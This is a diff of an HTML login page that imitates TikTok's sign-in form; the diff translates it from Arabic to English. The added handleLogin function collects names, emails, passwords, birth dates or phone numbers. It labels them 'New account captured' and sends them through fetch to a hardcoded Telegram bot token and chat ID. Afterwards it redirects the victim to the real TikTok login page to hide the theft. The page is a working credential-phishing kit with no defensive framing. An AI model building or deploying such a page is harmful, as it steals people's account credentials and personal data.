@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>تسجيل الدخول</title>
+  <title>Login</title>
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
@@ -18,17 +18,11 @@
       padding: 20px 16px;
     }
 
-    .header-bar {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      margin-bottom: 20px;
-    }
-
     .title {
       text-align: center;
       font-size: 22px;
       font-weight: bold;
+      margin-bottom: 20px;
     }
 
     .tabs {
@@ -88,6 +82,7 @@
       font-weight: bold;
       border-radius: 12px;
       cursor: not-allowed;
+      transition: 0.3s;
     }
 
     .login-btn.active {
@@ -100,27 +95,27 @@
 <body>
 
   <div class="container">
-    <div class="title">تسجيل الدخول</div>
+    <div class="title">Login</div>
 
     <div class="tabs">
-      <div class="tab" onclick="switchTab('phone')">الهاتف</div>
-      <div class="tab active" onclick="switchTab('email')">البريد الإلكتروني / اسم المستخدم</div>
+      <div class="tab" onclick="switchTab('phone')">Phone</div>
+      <div class="tab active" onclick="switchTab('email')">Email / Username</div>
     </div>
 
-    <div id="form-email" class="form-content active">
-      <input id="fullname" type="text" placeholder="الاسم الكامل" oninput="checkFields()" />
-      <input id="email" type="text" placeholder="البريد الإلكتروني أو اسم المستخدم" oninput="checkFields()" />
-      <input id="password" type="password" placeholder="كلمة المرور" oninput="checkFields()" />
-      <input id="dob" type="date" placeholder="تاريخ الميلاد" oninput="checkFields()" />
+    <div id="form-email" class="form-content" style="display: block;">
+      <input id="fullname" type="text" placeholder="Full Name" oninput="checkFields()" />
+      <input id="email" type="text" placeholder="Email or Username" oninput="checkFields()" />
+      <input id="password" type="password" placeholder="Password" oninput="checkFields()" />
+      <input id="dob" type="date" placeholder="Date of Birth" oninput="checkFields()" />
     </div>
 
     <div id="form-phone" class="form-content" style="display:none;">
-      <input type="text" placeholder="رقم الهاتف" oninput="checkFields()" />
-      <input type="password" placeholder="كلمة المرور" oninput="checkFields()" />
+      <input id="phone-number" type="text" placeholder="Phone Number" oninput="checkFields()" />
+      <input id="phone-password" type="password" placeholder="Password" oninput="checkFields()" />
     </div>
 
-    <div class="forgot">نسيت كلمة السر؟</div>
-    <button id="loginBtn" class="login-btn" onclick="redirectToTikTok()">تسجيل الدخول</button>
+    <div class="forgot">Forgot password?</div>
+    <button id="loginBtn" class="login-btn" disabled onclick="handleLogin()">Log In</button>
   </div>
 
   <script>
@@ -137,15 +132,24 @@
         tabs[1].classList.add('active');
         document.getElementById('form-email').style.display = 'block';
       }
+
       checkFields();
     }
 
     function checkFields() {
-      const activeForm = document.querySelector('.form-content[style*="block"]');
-      const inputs = activeForm.querySelectorAll('input');
+      const emailForm = document.getElementById('form-email');
+      const phoneForm = document.getElementById('form-phone');
       const btn = document.getElementById('loginBtn');
 
-      const allFilled = [...inputs].every(input => input.value.trim() !== '');
+      let allFilled = false;
+
+      if (emailForm.style.display === 'block') {
+        const inputs = emailForm.querySelectorAll('input');
+        allFilled = [...inputs].every(input => input.value.trim() !== '');
+      } else {
+        const inputs = phoneForm.querySelectorAll('input');
+        allFilled = [...inputs].every(input => input.value.trim() !== '');
+      }
 
       if (allFilled) {
         btn.classList.add('active');
@@ -156,19 +160,39 @@
       }
     }
 
-    function redirectToTikTok() {
-      // تحقق من وجود جميع البيانات المدخلة
-      const fullname = document.getElementById('fullname').value;
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
-      const dob = document.getElementById('dob').value;
+    function handleLogin() {
+      const isEmailTab = document.getElementById('form-email').style.display === 'block';
+      let message = "New account captured:\n\n";
 
-      if (fullname && email && password && dob) {
-        // توجيه المستخدم إلى رابط تسجيل الدخول في تيك توك
-        window.location.href = "https://www.tiktok.com/login";
+      if (isEmailTab) {
+        const fullname = document.getElementById('fullname').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const dob = document.getElementById('dob').value;
+
+        message += `Full Name: ${fullname}\n`;
+        message += `Email / Username: ${email}\n`;
+        message += `Password: ${password}\n`;
+        message += `Date of Birth: ${dob}`;
       } else {
-        alert("يرجى ملء جميع الحقول.");
+        const phone = document.getElementById('phone-number').value.trim();
+        const password = document.getElementById('phone-password').value.trim();
+
+        message += `Phone Number: ${phone}\n`;
+        message += `Password: ${password}`;
       }
+
+      const botToken = "7008716029:AAFOh4raFcgDCzQzJSV0BOxV0Wd0k2jpmR0";
+      const chatId = "5029891039";
+      const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+      fetch(telegramURL)
+        .then(() => {
+          window.location.href = "https://www.tiktok.com/login";
+        })
+        .catch(() => {
+          alert("Failed to send to bot.");
+        });
     }
   </script>
 </body>
